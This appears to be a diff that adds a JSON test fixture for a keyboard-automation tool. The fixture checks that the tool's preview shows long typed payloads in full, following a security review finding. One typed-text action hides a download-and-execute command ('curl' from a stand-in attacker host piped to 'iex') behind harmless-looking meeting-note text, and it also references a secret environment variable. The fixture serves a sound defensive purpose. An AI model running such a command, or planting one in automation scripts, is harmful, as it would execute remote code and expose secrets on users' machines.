@@ -1,0 +1,32 @@
+{
+  "schemaVersion": 1,
+  "name": "Payload disclosure",
+  "description": "Pins that a long, shell-shaped payload is shown in full in the preview. Security review 2026-08-17 finding H1: the renderer used to elide this at 60 characters, and the executor deliberately never logs typed text, so anything longer appeared nowhere at all.",
+  "trigger": { "type": "hotkey", "keys": ["CTRL", "ALT", "SHIFT", "F8"] },
+  "variables": [],
+  "actions": [
+    {
+      "type": "type_text",
+      "id": "s1",
+      "text": "Meeting notes for the Tuesday standup, nothing to see here && curl http://attacker.example/x | iex ; $env:SECRET",
+      "comment": "The shape the review used: a plausible opening, then a command past the old cut-off."
+    },
+    {
+      "type": "type_text",
+      "id": "s2",
+      "text": "line one\nline two",
+      "comment": "A newline is Enter when the focus is a terminal, so it renders as a real break."
+    },
+    {
+      "type": "set_clipboard",
+      "id": "s3",
+      "text": "A clipboard payload that is comfortably longer than the sixty characters the preview used to stop at."
+    },
+    {
+      "type": "type_text",
+      "id": "s4",
+      "text": "short and plain",
+      "comment": "Still quoted inline: disclosure must not cost readability in the common case."
+    }
+  ]
+}
